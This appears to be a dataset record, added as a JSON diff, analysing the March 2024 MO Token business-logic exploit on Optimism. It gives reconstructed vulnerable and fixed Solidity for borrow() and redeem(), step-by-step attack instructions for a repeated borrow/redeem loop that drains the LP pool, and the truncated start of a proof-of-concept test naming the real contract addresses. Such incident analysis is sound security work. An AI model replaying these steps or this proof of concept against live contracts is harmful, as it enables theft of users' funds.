@@ -1,0 +1,46 @@
+{
+ "id": "2024__2024-03-14_MOToken_BusinessLogic_OP",
+ "source_file": "2024/2024-03-14_MOToken_BusinessLogic_OP.md",
+ "title": "MO Token — Business Logic Vulnerability Analysis",
+ "date": "2024-03-14",
+ "protocol": "MO Token",
+ "chain": "Optimism",
+ "loss_raw": "~$750,000 (attacker profit ~$413K USD+)",
+ "loss_usd": 750000.0,
+ "root_cause": "Business logic flaw enabling unlimited MO token withdrawal from the LP pool via repeated `borrow()` + `redeem()` calls",
+ "attack_tx": "0x4ec306...7417",
+ "vulnerable_contract": null,
+ "classes": [
+  "business-logic"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable code — withdraws MO from LP but lacks sufficient state validation\nfunction borrow(uint256 amount, uint256 duration) external {\n    // Does not block duration=0 — allows immediate redeem\n    require(amount > 0, \"amount must > 0\");\n\n    // Transfers user's actual MO balance via approve_proxy\n    // ❌ Issue: same caller can call with same amount any number of times\n    // ❌ Issue: no cumulative validation on MO withdrawn from LP pool\n    IERC20(MO).transferFrom(msg.sender, address(this), amount);\n\n    // Creates loan order — each call assigns a new order index\n    uint256 index = borrowOrders[msg.sender].length;\n    borrowOrders[msg.sender].push(BorrowOrder({\n        amount: amount,\n        duration: duration,\n        timestamp: block.timestamp\n    }));\n\n    // Pays out USDT/MO from LP pool to attacker as collateral value\n    // ❌ Issue: no logic limiting MO outflow from LP\n    UniV2Pair.transfer(msg.sender, calculateBorrowAmount(amount));\n\n    emit Borrow(msg.sender, index, amount, duration);\n}",
+  "// ❌ Vulnerable code — immediately returns collateral MO to attacker after repayment\nfunction redeem(uint256 index) external {\n    BorrowOrder storage order = borrowOrders[msg.sender][index];\n    require(order.amount > 0, \"order not found\");\n\n    // ❌ Issue: duration=0 allows immediate repayment\n    // require(block.timestamp >= order.timestamp + order.duration, \"not yet\");\n\n    uint256 amount = order.amount;\n    order.amount = 0; // reset order\n\n    // ❌ Active loan amount not decremented (or incorrectly tracked)\n    // Returns MO tokens to attacker → attacker can call borrow() again\n    IERC20(MO).transfer(msg.sender, amount);\n\n    emit Redeem(msg.sender, index, amount);\n}",
+  "// ❌ Vulnerable pattern: borrow→redeem repeated with same mo_balance\n// Each cycle extracts MO from the LP pool while the attacker reuses the same collateral\nfunction do_some_borrow(uint256 i) public {\n    LOAN.borrow(mo_balance, 0);  // withdraws MO from LP (creates i-th order)\n    LOAN.redeem(i);              // returns collateral MO → reusable in next loop\n}"
+ ],
+ "code_after": [
+  "// ✅ Fixed code — prevents repeated borrowing + validates LP withdrawal limits\nmapping(address => uint256) public activeBorrowAmount; // tracks active loan balance\n\nfunction borrow(uint256 amount, uint256 duration) external {\n    require(amount > 0, \"amount must > 0\");\n    require(duration > 0, \"duration must > 0\"); // ✅ blocks immediate repayment (duration=0)\n\n    // ✅ Prevents exceeding user's active borrow limit\n    uint256 maxBorrow = calculateMaxBorrow(msg.sender);\n    require(activeBorrowAmount[msg.sender] + amount <= maxBorrow, \"exceeds borrow limit\");\n\n    // ✅ Cumulatively tracks active loan amount\n    activeBorrowAmount[msg.sender] += amount;\n\n    IERC20(MO).transferFrom(msg.sender, address(this), amount);\n\n    uint256 index = borrowOrders[msg.sender].length;\n    borrowOrders[msg.sender].push(BorrowOrder({\n        amount: amount,\n        duration: duration,\n        timestamp: block.timestamp\n    }));\n\n    UniV2Pair.transfer(msg.sender, calculateBorrowAmount(amount));\n    emit Borrow(msg.sender, index, amount, duration);\n}",
+  "// ✅ Fixed code — enforces minimum loan duration + decrements active balance\nfunction redeem(uint256 index) external {\n    BorrowOrder storage order = borrowOrders[msg.sender][index];\n    require(order.amount > 0, \"order not found or already redeemed\");\n\n    // ✅ Checks that minimum loan period has elapsed (duration=0 blocked at borrow level)\n    require(\n        block.timestamp >= order.timestamp + order.duration,\n        \"borrow period not elapsed\"\n    );\n\n    uint256 amount = order.amount;\n    order.amount = 0;\n\n    // ✅ Decrements active loan amount — ensures future borrow limits are calculated correctly\n    activeBorrowAmount[msg.sender] -= amount;\n\n    IERC20(MO).transfer(msg.sender, amount);\n    emit Redeem(msg.sender, index, amount);\n}"
+ ],
+ "steps": [
+  "1. **[Setup]** Fork Optimism at block 117,395,511",
+  "2. **[Acquire MO]** Obtain 62,147,724 MO via `deal()` (test environment; acquired separately in the actual attack)",
+  "3. **[Deploy Helper]** Deploy `Money` contract and delegate approve to attacker address",
+  "4. **[Begin Loop]** Repeat up to 80 times starting from `i = 0`:",
+  "- `LOAN.borrow(mo_balance, 0)`: request loan with full MO balance → withdraw MO from LP pool",
+  "- `LOAN.redeem(i)`: immediately repay the just-created order → reclaim MO collateral",
+  "5. **[Final Withdrawal]** `LOAN.borrow(MO.balanceOf(UniV2Pair) - 1, 0)`: drain all remaining MO from LP",
+  "6. **[Swap]** `Router.swapExactTokensForTokens()`: swap acquired MO for USDT",
+  "7. **[Profit]** Profit realized in USDT",
+  "1. call borrow() - create order index=i",
+  "2. call redeem(i) ◀ - withdraw MO from LP",
+  "borrow()→redeem() (MO/USDT pair)",
+  "repeat → LP drain MO balance ↓ drops",
+  "→ drain all remaining MO from LP pool",
+  "swapExactTokensForTokens(MO → USDT)"
+ ],
+ "other_code": [
+  "┌─────────────────────────────────────────────────────────────────┐\n│                     Attacker (EOA)                               │\n│                Holds 62,147,724 units of MO tokens               │\n└────────────────────────┬────────────────────────────────────────┘\n                         │ approve(approve_proxy, max)\n                         ▼\n┌─────────────────────────────────────────────────────────────────┐\n│                    approve_proxy contract                         │\n│            (MO and USDT transfer delegation hub)                 │\n└─────────────────────────────────────────────────────────────────┘\n\n         ┌──────────────────── Repeat Loop (up to 80x) ───────────────────────┐\n         │                                                                    │\n        ",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\n// [Step 1] Contract and interface definitions\ninterface Loan {\n    function borrow(uint256 amount, uint256 duration) external; // execute loan\n    function redeem(uint256 index) external;                    // repay loan + return collateral\n    function borrowOrdersCount(address account) external view returns (uint256);\n}\n\ncontract contractTest is Test {\n    IERC20 constant MO   = IERC20(0x61445Ca401051c86848ea6b1fAd79c5527116AA1); // MO token\n    IERC20 constant USDT = IERC20(0x94b008aA00579c1307B0EF2c499aD98a8ce58e58); // USDT\n    Loan   constant LOAN = Loan(0xAe7b6514Af26BcB2332FEA53B8Dd57bc13A7838E);   // vulnerable contract\n    address constant approve_proxy = 0x9D8355a8D721E5c79589ac0aB49BC6d3e0eF7C3F;\n    Uni_Router_V"
+ ]
+}
